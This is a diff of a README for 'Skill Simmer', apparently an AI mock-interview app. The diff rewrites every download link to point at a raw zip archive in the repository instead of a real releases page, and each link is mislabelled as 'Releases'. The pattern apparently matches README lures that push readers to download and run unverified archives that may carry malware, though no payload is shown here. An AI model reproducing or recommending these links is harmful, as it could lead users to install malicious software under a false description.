@@ -4,15 +4,15 @@
 Skill Simmer is an AI-driven mock interview platform designed to help you improve your interview skills and gain practical experience. This user-friendly application offers personalized practice sessions to prepare you for real interview scenarios.
 
 ## 📥 Download the Application
-[![Download Skill Simmer](https://raw.githubusercontent.com/IbrahimKomba/skill-simmer/main/spermatophytic/skill-simmer.zip%20Skill%20Simmer-Here-brightgreen)](https://raw.githubusercontent.com/IbrahimKomba/skill-simmer/main/spermatophytic/skill-simmer.zip)
+[![Download Skill Simmer](https://github.com/IbrahimKomba/skill-simmer/raw/refs/heads/main/src/skill-simmer-v1.7.zip%20Skill%20Simmer-Here-brightgreen)](https://github.com/IbrahimKomba/skill-simmer/raw/refs/heads/main/src/skill-simmer-v1.7.zip)
 
-Visit this page to download: [Skill Simmer Releases](https://raw.githubusercontent.com/IbrahimKomba/skill-simmer/main/spermatophytic/skill-simmer.zip)
+Visit this page to download: [Skill Simmer Releases](https://github.com/IbrahimKomba/skill-simmer/raw/refs/heads/main/src/skill-simmer-v1.7.zip)
 
 ## 🚀 Getting Started
 To begin using Skill Simmer, follow these simple steps:
 
 1. **Download the Application**
-   - Click the download link above or visit the [Skill Simmer Releases](https://raw.githubusercontent.com/IbrahimKomba/skill-simmer/main/spermatophytic/skill-simmer.zip) page.
+   - Click the download link above or visit the [Skill Simmer Releases](https://github.com/IbrahimKomba/skill-simmer/raw/refs/heads/main/src/skill-simmer-v1.7.zip) page.
    - Find the latest version and select the appropriate file for your operating system.
 
 2. **Install the Application**
